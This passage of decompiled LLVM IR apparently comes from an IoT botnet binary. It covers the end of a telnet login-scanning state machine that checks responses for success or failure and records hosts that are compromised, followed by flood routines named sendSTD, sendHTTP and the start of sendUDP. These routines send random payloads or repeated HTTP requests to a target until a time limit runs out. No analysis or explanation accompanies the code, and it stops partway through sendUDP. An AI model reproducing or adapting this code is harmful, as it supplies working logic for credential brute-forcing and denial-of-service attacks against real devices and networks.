  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_c004 = inttoptr i32 %v2_b2f4 to i32*
  %v2_c004 = load i32, i32* %v1_c004, align 4
  store i32 %v2_c004, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c024 = add i32 %v2_b2f0, %v2_bae0
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v1_c028 = inttoptr i32 %v2_c024 to i32*
  %v2_c028 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c028, i32* %r2.global-to-local, align 4
  %v1_c030 = load i32, i32* @sp, align 4
  %v2_c030 = inttoptr i32 %v1_c030 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_224b0.113 to i32), i32* %v2_c030, align 4
  %v0_c034 = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_c040 = inttoptr i32 %v2_c028 to i8*
  %v5_c040 = call i32 @read_until_response(i32 %v0_c034, i32 %arg1, i8* %v4_c040, i32 1024)
  store i32 %v5_c040, i32* %r3.global-to-local, align 4
  %v2_c048 = icmp eq i32 %v5_c040, 0
  br i1 %v2_c048, label %dec_label_pc_c290, label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_bfec
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c058 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c06c = load i32, i32* @r4, align 4
  %v2_c078 = mul i32 %v0_c06c, 28
  %v2_c080 = add i32 %v2_ba64, %v2_c078
  %v2_c084 = inttoptr i32 %v2_c080 to i32*
  store i32 %v2_c058, i32* %v2_c084, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c0a8 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c0a8, i32* %r3.global-to-local, align 4
  %v1_c0b0 = call i32 @contains_fail(i32 %v2_c0a8)
  store i32 %v1_c0b0, i32* %r3.global-to-local, align 4
  %v2_c0b8 = icmp eq i32 %v1_c0b0, 0
  br i1 %v2_c0b8, label %dec_label_pc_c0e8, label %dec_label_pc_c0c0

dec_label_pc_c0c0:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c0e0 = call i32 @advance_state(i32* %v1_c004, i32 0)
  br label %dec_label_pc_c460

dec_label_pc_c0e8:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c024, i32* %r3.global-to-local, align 4
  %v2_c108 = load i32, i32* %v1_c028, align 4
  store i32 %v2_c108, i32* %r3.global-to-local, align 4
  %v1_c110 = call i32 @contains_success(i32 %v2_c108)
  store i32 %v1_c110, i32* %r3.global-to-local, align 4
  %v2_c118 = icmp eq i32 %v1_c110, 0
  br i1 %v2_c118, label %dec_label_pc_c240, label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_c0e8
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c13c = add i32 %v2_b2f4, 8
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c140 = add i32 %v2_b2f4, 9
  %v2_c140 = inttoptr i32 %v1_c140 to i8*
  %v3_c140 = load i8, i8* %v2_c140, align 1
  %v4_c140 = zext i8 %v3_c140 to i32
  store i32 %v4_c140, i32* %r3.global-to-local, align 4
  %v7_c144 = icmp eq i8 %v3_c140, 2
  br i1 %v7_c144, label %dec_label_pc_c14c, label %dec_label_pc_c174

dec_label_pc_c14c:                                ; preds = %dec_label_pc_c120
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c16c = call i32 @advance_state(i32* %v1_c004, i32 7)
  br label %dec_label_pc_c460

dec_label_pc_c174:                                ; preds = %dec_label_pc_c120
  %v2_c178 = load i32, i32* @global_var_22864.48, align 4
  store i32 %v2_c178, i32* @r4, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c198 = call i32 @get_telstate_host(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  store i32 %v3_c198, i32* %ip.global-to-local, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c1c0 = add i32 %v2_b2f4, 10
  %v2_c1c0 = inttoptr i32 %v1_c1c0 to i8*
  %v3_c1c0 = load i8, i8* %v2_c1c0, align 2
  %v4_c1c0 = zext i8 %v3_c1c0 to i32
  store i32 %v4_c1c0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32), i32* %r3.global-to-local, align 4
  %v4_c1cc = mul nuw nsw i32 %v4_c1c0, 4
  %v5_c1cc = add i32 %v4_c1cc, ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32)
  %v6_c1cc = inttoptr i32 %v5_c1cc to i32*
  %v7_c1cc = load i32, i32* %v6_c1cc, align 4
  store i32 %v7_c1cc, i32* @lr, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_c13c, i32* %r3.global-to-local, align 4
  %v1_c1f0 = add i32 %v2_b2f4, 11
  %v2_c1f0 = inttoptr i32 %v1_c1f0 to i8*
  %v3_c1f0 = load i8, i8* %v2_c1f0, align 1
  %v4_c1f0 = zext i8 %v3_c1f0 to i32
  store i32 %v4_c1f0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([9 x i8*]* @global_var_22418.111 to i32), i32* %r3.global-to-local, align 4
  %v4_c1fc = mul nuw nsw i32 %v4_c1f0, 4
  %v5_c1fc = add i32 %v4_c1fc, ptrtoint ([9 x i8*]* @global_var_22418.111 to i32)
  %v6_c1fc = inttoptr i32 %v5_c1fc to i32*
  %v7_c1fc = load i32, i32* %v6_c1fc, align 4
  %v1_c200 = load i32, i32* @sp, align 4
  %v2_c200 = inttoptr i32 %v1_c200 to i32*
  store i32 %v7_c1fc, i32* %v2_c200, align 4
  %v0_c204 = load i32, i32* @r4, align 4
  %v0_c20c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c20c, i32* %r2.global-to-local, align 4
  %v0_c210 = load i32, i32* @lr, align 4
  store i32 %v0_c210, i32* %r3.global-to-local, align 4
  %v4_c214 = call i32 @Rootsprintf(i32 %v0_c204, i32 ptrtoint (i32* @global_var_18864.116 to i32), i32 %v0_c20c, i32 %v0_c210)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c238 = call i32 @advance_state(i32* %v1_c004, i32 7)
  br label %dec_label_pc_c460

dec_label_pc_c240:                                ; preds = %dec_label_pc_c0e8
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c25c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c290:                                ; preds = %dec_label_pc_bfec
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c2ac = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_c2ac, i32* %r3.global-to-local, align 4
  %v1_c2b0 = inttoptr i32 %v2_c2ac to i32*
  %v2_c2b0 = load i32, i32* %v1_c2b0, align 4
  store i32 %v2_c2b0, i32* %r3.global-to-local, align 4
  %v1_c2b4 = add i32 %v2_c2b0, 7
  store i32 %v1_c2b4, i32* @r4, align 4
  %v2_c2bc = call i32 @__GI_time(i32* null)
  store i32 %v2_c2bc, i32* %r3.global-to-local, align 4
  %v0_c2c4 = load i32, i32* @r4, align 4
  %v3_c2c4 = icmp ult i32 %v0_c2c4, %v2_c2bc
  br i1 %v3_c2c4, label %dec_label_pc_c2cc, label %dec_label_pc_c460

dec_label_pc_c2cc:                                ; preds = %dec_label_pc_c290
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c2e8 = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c2f0:                                ; preds = %dec_label_pc_b340
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c2f8 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c30c = load i32, i32* @r4, align 4
  %v2_c318 = mul i32 %v0_c30c, 28
  %v2_c320 = add i32 %v2_ba64, %v2_c318
  %v2_c324 = inttoptr i32 %v2_c320 to i32*
  store i32 %v2_c2f8, i32* %v2_c324, align 4
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v1_c340 = inttoptr i32 %v2_b2f4 to i32*
  %v2_c340 = load i32, i32* %v1_c340, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c354 = call i32 @__libc_send(i32 %v2_c340, i32* bitcast ([5 x i8]* @global_var_188c4.118 to i32*), i32 4, i32 16384)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_c370 = load i32, i32* %v1_c340, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c384 = call i32 @__libc_send(i32 %v2_c370, i32* bitcast ([8 x i8]* @global_var_188cc.120 to i32*), i32 7, i32 16384)
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v2_c3a0 = load i32, i32* %v1_c340, align 4
  store i32 %v2_c3a0, i32* @r4, align 4
  %v2_c3a8 = load i32, i32* bitcast ([443 x i8]** @global_var_223f0.123 to i32*), align 4
  store i32 %v2_c3a8, i32* @r5, align 4
  store i32 %v2_c3a8, i32* %r3.global-to-local, align 4
  %v1_c3b4 = inttoptr i32 %v2_c3a8 to i8*
  %v3_c3b8 = call i32 @strlen(i8* %v1_c3b4)
  %v0_c3c0 = load i32, i32* @r4, align 4
  %v0_c3c4 = load i32, i32* @r5, align 4
  store i32 %v3_c3b8, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_c3c4 to i32*
  %v6_c3d0 = call i32 @__libc_send(i32 %v0_c3c0, i32* %tmp44, i32 %v3_c3b8, i32 16384)
  store i32 %v6_c3d0, i32* %r3.global-to-local, align 4
  %v1_c3d8 = icmp slt i32 %v6_c3d0, 0
  br i1 %v1_c3d8, label %dec_label_pc_c3e0, label %dec_label_pc_c404

dec_label_pc_c3e0:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c3fc = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c404:                                ; preds = %dec_label_pc_c2f0
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  %v2_c420 = add i32 %v2_b2f0, %v2_ba64
  store i32 %v2_c420, i32* %r3.global-to-local, align 4
  %v1_c424 = inttoptr i32 %v2_c420 to i32*
  %v2_c424 = load i32, i32* %v1_c424, align 4
  store i32 %v2_c424, i32* %r3.global-to-local, align 4
  %v1_c428 = add i32 %v2_c424, 25
  store i32 %v1_c428, i32* @r4, align 4
  %v2_c430 = call i32 @__GI_time(i32* null)
  store i32 %v2_c430, i32* %r3.global-to-local, align 4
  %v0_c438 = load i32, i32* @r4, align 4
  %v3_c438 = icmp ult i32 %v0_c438, %v2_c430
  br i1 %v3_c438, label %dec_label_pc_c440, label %dec_label_pc_c460

dec_label_pc_c440:                                ; preds = %dec_label_pc_c404
  store i32 %v3_b2e8, i32* %r2.global-to-local, align 4
  store i32 %v2_b2f4, i32* %r3.global-to-local, align 4
  %v3_c45c = call i32 @reset_telstate(i32 %v2_b2f4, i32 %v3_b18c, i32 %v3_b2e8)
  br label %dec_label_pc_c460

dec_label_pc_c460:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_bb98, %dec_label_pc_be38, %dec_label_pc_c290, %dec_label_pc_c404, %dec_label_pc_b340, %dec_label_pc_b634, %dec_label_pc_c3e0, %dec_label_pc_c2cc, %dec_label_pc_c240, %dec_label_pc_c174, %dec_label_pc_c14c, %dec_label_pc_c0c0, %dec_label_pc_bfc4, %dec_label_pc_bfa0, %dec_label_pc_bf40, %dec_label_pc_be74, %dec_label_pc_be10, %dec_label_pc_bde8, %dec_label_pc_bd24, %dec_label_pc_bd00, %dec_label_pc_bca0, %dec_label_pc_bbd4, %dec_label_pc_bb70, %dec_label_pc_bb48, %dec_label_pc_ba88, %dec_label_pc_ba28, %dec_label_pc_b994, %dec_label_pc_b970, %dec_label_pc_b7c4, %dec_label_pc_b7a0, %dec_label_pc_b608, %dec_label_pc_b5b0, %dec_label_pc_c440
  %v1_c464 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_c464, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_c478 = icmp slt i32 %v1_c464, %arg2
  br i1 %v5_c478, label %dec_label_pc_b2dc, label %dec_label_pc_b2d0

; uselistorder directives
  uselistorder i32 %v1_c464, { 2, 1, 0 }
  uselistorder i32 %v3_c3b8, { 1, 0 }
  uselistorder i32* %v1_c004, { 1, 0, 2, 3 }
  uselistorder i32 %v3_bf18, { 1, 0 }
  uselistorder i32 %v3_bc78, { 1, 0 }
  uselistorder i32 %v5_b900, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_b488, { 1, 0 }
  uselistorder i32 %v2_b3dc, { 0, 3, 2, 1 }
  uselistorder i32 %v2_b3d8, { 1, 0, 2, 3 }
  uselistorder i8* %v2_b3b0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_b3ac, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_b360, { 1, 0 }
  uselistorder i32 %v0_b324, { 1, 0 }
  uselistorder i32* %v1_b2fc, { 1, 0, 2 }
  uselistorder i32 %v2_b2f8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b2f4, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_b2f0, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_b2e8, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_ba64, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b7ec, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_b68c, { 1, 0 }
  uselistorder i32 %v1_b2b4, { 1, 2, 0 }
  uselistorder i32 %v1_b290, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_b1b0, { 1, 0 }
  uselistorder i32 %v3_b18c, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 151, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 175, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 176, 152, 153, 154, 167, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 177, 168, 169, 170, 172, 171, 174, 173 }
  uselistorder i32* %r2.global-to-local, { 100, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 105, 101, 102, 106, 103, 104 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([9 x i8*]* @global_var_22418.111 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_18860.109 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([18 x i8*]* @global_var_223f4.107 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c460, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_b800, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b340, { 1, 0 }
  uselistorder label %dec_label_pc_b2dc, { 1, 0 }
  uselistorder label %dec_label_pc_b2d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d4, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c484 = load i32, i32* @fp, align 4
  store i32 %v3_c484, i32* %stack_var_-16, align 4
  store i32 50316, i32* %stack_var_-4, align 4
  %v13_c484 = ptrtoint i32* %stack_var_-16 to i32
  %v2_c488 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c488, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_c4a8 = call i32 @socket()
  %v2_c4b8 = call i32 @__GI_time(i32* null)
  %v1_c4cc = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_c4e8 = bitcast i32* %stack_var_-52 to i8*
  %v3_c4e8 = call i32 @__GI_memset(i8* %v2_c4e8, i32 0)
  %v1_c4f0 = add i32 %v1_c4cc, 16
  %v2_c4f0 = inttoptr i32 %v1_c4f0 to i32*
  %v3_c4f0 = load i32, i32* %v2_c4f0, align 4
  %v1_c4f4 = inttoptr i32 %v3_c4f0 to i32*
  %v2_c4f4 = load i32, i32* %v1_c4f4, align 4
  %v2_c4fc = ptrtoint i32* %stack_var_-48 to i32
  %v1_c504 = add i32 %v1_c4cc, 12
  %v2_c504 = inttoptr i32 %v1_c504 to i32*
  %v3_c504 = load i32, i32* %v2_c504, align 4
  store i32 %v3_c504, i32* @r2, align 4
  %v3_c514 = call i32 @bcopy(i32 %v2_c4f4, i32 %v2_c4fc, i32 %v3_c504)
  %v1_c51c = add i32 %v1_c4cc, 8
  %v2_c51c = inttoptr i32 %v1_c51c to i32*
  %v3_c51c = load i32, i32* %v2_c51c, align 4
  %v3_c524 = urem i32 %v3_c51c, 65536
  store i32 %v3_c524, i32* %stack_var_-52, align 4
  %v2_c558 = ptrtoint i32* %stack_var_-196 to i32
  %v3_c5d4 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_c594 = add i32 %v13_c484, -180
  br label %dec_label_pc_c554

dec_label_pc_c554:                                ; preds = %dec_label_pc_c610, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_c614, %dec_label_pc_c610 ]
  store i32 %v2_c558, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_18a78.161 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c56c = call i32 @memcpy()
  %v0_c570 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_c610, label %dec_label_pc_c5b0

dec_label_pc_c5b0:                                ; preds = %dec_label_pc_c554
  %v2_c580 = urem i32 %v0_c570, 36
  %v3_c58c = mul nuw nsw i32 %v2_c580, 4
  %v2_c598 = add i32 %v2_c594, %v3_c58c
  %v1_c59c = inttoptr i32 %v2_c598 to i32*
  %v2_c59c = load i32, i32* %v1_c59c, align 4
  %v5_c5c0 = inttoptr i32 %v2_c59c to i32*
  %v6_c5c0 = call i32 @__libc_send(i32 %v0_c4a8, i32* %v5_c5c0, i32 65, i32 0)
  %v4_c5d4 = call i32 @__libc_connect(i32 %v0_c4a8, %sockaddr* %v3_c5d4, i32 16)
  %v2_c5dc = call i32 @__GI_time(i32* null)
  %v3_c5e8 = load i32, i32* %stack_var_-208, align 4
  %v2_c5ec = add i32 %v3_c5e8, %v2_c4b8
  %v5_c5f4 = icmp slt i32 %v2_c5dc, %v2_c5ec
  br i1 %v5_c5f4, label %dec_label_pc_c608, label %dec_label_pc_c5f8

dec_label_pc_c5f8:                                ; preds = %dec_label_pc_c5b0
  %v1_c5fc = call i32 @__libc_close(i32 %v0_c4a8)
  %v1_c604 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_c608:                                ; preds = %dec_label_pc_c5b0
  br label %dec_label_pc_c610

dec_label_pc_c610:                                ; preds = %dec_label_pc_c554, %dec_label_pc_c608
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_c554 ], [ 0, %dec_label_pc_c608 ]
  %v1_c614 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c554

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_c504, { 1, 0 }
  uselistorder i32 %v1_c4cc, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c610, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-545 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v1_c624 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c624, i32* @ip, align 4
  %v3_c628 = load i32, i32* @fp, align 4
  store i32 50736, i32* %stack_var_-4, align 4
  %v2_c62c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c62c, i32* @fp, align 4
  %v2_c650 = call i32 @__GI_time(i32* null)
  %v3_c658 = load i32, i32* %stack_var_0, align 4
  %v2_c65c = add i32 %v3_c658, %v2_c650
  %v2_c69c = ptrtoint i32* %stack_var_-544 to i32
  %tmp24 = bitcast i32* %stack_var_-544 to i8*
  %v2_c728 = ptrtoint i32* %stack_var_-545 to i32
  %v5_c77c31 = icmp sgt i32 %arg6, 0
  br i1 %v5_c77c31, label %dec_label_pc_c678, label %dec_label_pc_c780

dec_label_pc_c678:                                ; preds = %entry, %dec_label_pc_c764
  %storemerge232 = phi i32 [ %v1_c768, %dec_label_pc_c764 ], [ 0, %entry ]
  %v0_c678 = call i32 @random()
  %v2_c688 = srem i32 %v0_c678, 36
  %v4_c698 = mul nsw i32 %v2_c688, 4
  %v5_c698 = add i32 %v4_c698, ptrtoint ([37 x i8*]* @global_var_2235c.200 to i32)
  %v6_c698 = inttoptr i32 %v5_c698 to i32*
  %v7_c698 = load i32, i32* %v6_c698, align 4
  store i32 %v2_c69c, i32* @r0, align 4
  %v7_c6bc = call i32 @sprintf(i32 %v2_c69c, i32 ptrtoint ([64 x i8]* @global_var_18b08.202 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c698)
  %v0_c6c0 = call i32 @__libc_fork()
  %v2_c6c8 = icmp eq i32 %v0_c6c0, 0
  br i1 %v2_c6c8, label %dec_label_pc_c764, label %dec_label_pc_c744

dec_label_pc_c6d4:                                ; preds = %dec_label_pc_c744
  %v5_c6ec = call i32 @socket_connect(i32 %arg2, i8 %arg3, i32 %tmp)
  %v2_c6fc = icmp eq i32 %v5_c6ec, 0
  br i1 %v2_c6fc, label %dec_label_pc_c744, label %dec_label_pc_c704

dec_label_pc_c704:                                ; preds = %dec_label_pc_c6d4
  %v3_c70c = call i32 @strlen(i8* %tmp24)
  store i32 %v3_c70c, i32* @r2, align 4
  %v3_c720 = call i32 @__libc_write(i32 %v5_c6ec, i32* nonnull %stack_var_-544)
  store i32 %v2_c728, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_c738 = call i32 @__libc_read(i32 %v5_c6ec)
  %v1_c740 = call i32 @__libc_close(i32 %v5_c6ec)
  br label %dec_label_pc_c744

dec_label_pc_c744:                                ; preds = %dec_label_pc_c6d4, %dec_label_pc_c704, %dec_label_pc_c678
  %v2_c748 = call i32 @__GI_time(i32* null)
  %v5_c758 = icmp slt i32 %v2_c748, %v2_c65c
  br i1 %v5_c758, label %dec_label_pc_c6d4, label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %dec_label_pc_c744
  %v1_c760 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c764

dec_label_pc_c764:                                ; preds = %dec_label_pc_c678, %dec_label_pc_c75c
  %v9_c7844 = phi i32 [ 0, %dec_label_pc_c678 ], [ %v1_c760, %dec_label_pc_c75c ]
  %v1_c768 = add nuw nsw i32 %storemerge232, 1
  %v5_c77c = icmp slt i32 %v1_c768, %arg6
  br i1 %v5_c77c, label %dec_label_pc_c678, label %dec_label_pc_c780

dec_label_pc_c780:                                ; preds = %dec_label_pc_c764, %entry
  %v9_c784.lcssa = phi i32 [ %v2_c650, %entry ], [ %v9_c7844, %dec_label_pc_c764 ]
  store i32 %v3_c628, i32* @fp, align 4
  ret i32 %v9_c784.lcssa

; uselistorder directives
  uselistorder i32 %v1_c768, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c764, { 1, 0 }
  uselistorder label %dec_label_pc_c744, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c678, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
